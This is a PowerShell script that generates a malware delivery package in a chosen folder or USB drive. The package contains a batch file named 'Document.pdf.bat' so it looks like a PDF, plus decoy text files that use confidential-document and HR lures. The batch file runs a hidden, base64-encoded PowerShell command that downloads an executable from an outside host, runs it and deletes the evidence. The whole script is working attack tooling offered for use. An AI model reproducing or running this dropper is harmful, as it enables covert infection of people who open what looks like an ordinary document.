param(
    [string]$Path = "",
    [switch]$Zip
)

$rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p;sleep -m 500;ri `$p -Force"
$encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
$encCmd = [Convert]::ToBase64String($encBytes)

if (!$Path) {
    $Path = Read-Host "Enter target path (USB drive or folder)"
    if (!$Path) { Write-Error "No path provided"; exit 1 }
}

$Path = [IO.Path]::GetFullPath($Path)
if (!(Test-Path $Path)) { Write-Error "Path does not exist: $Path"; exit 1 }

Write-Output "Generating payload in: $Path"

# Document.pdf.bat (shows as Document.pdf with extensions hidden)
Set-Content "$Path\Document.pdf.bat" "@echo off`r`npowershell -w h -Enc $encCmd" -Encoding ASCII
Write-Output "  [+] Document.pdf.bat created"

# Decoy Document.txt
Set-Content "$Path\Document.txt" "This document contains confidential information.`r`nFor authorized personnel only.`r`n`r`nPlease review and sign the attached agreement." -Encoding UTF8
Write-Output "  [+] Document.txt created"

# Decoy README.txt
Set-Content "$Path\README.txt" "Thank you for reviewing this document.`r`nPlease ensure all sections are completed`r`nbefore the deadline.`r`n`r`nIf you have any questions, contact the HR department." -Encoding UTF8
Write-Output "  [+] README.txt created"

# Optional zip
if ($Zip) {
    $zipFiles = @()
    foreach ($f in @("Document.pdf.bat", "Document.txt", "README.txt")) {
        $fp = "$Path\$f"
        if (Test-Path $fp) { $zipFiles += $fp }
    }
    $zipPath = "$Path\Document.zip"
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    if ($zipFiles.Count -gt 0) {
        Compress-Archive -Path $zipFiles -DestinationPath $zipPath -CompressionLevel Optimal
        Write-Output "  [+] Document.zip created"
    }
}

Write-Output ""
Write-Output "=== DELIVERY SUMMARY ==="
Write-Output "Folder: $Path"
Write-Output "Batch:  Document.pdf.bat (shows as Document.pdf with extensions hidden)"
if ($Zip -and (Test-Path "$Path\Document.zip")) { Write-Output "Zipped: Document.zip" }
Write-Output "=========================="
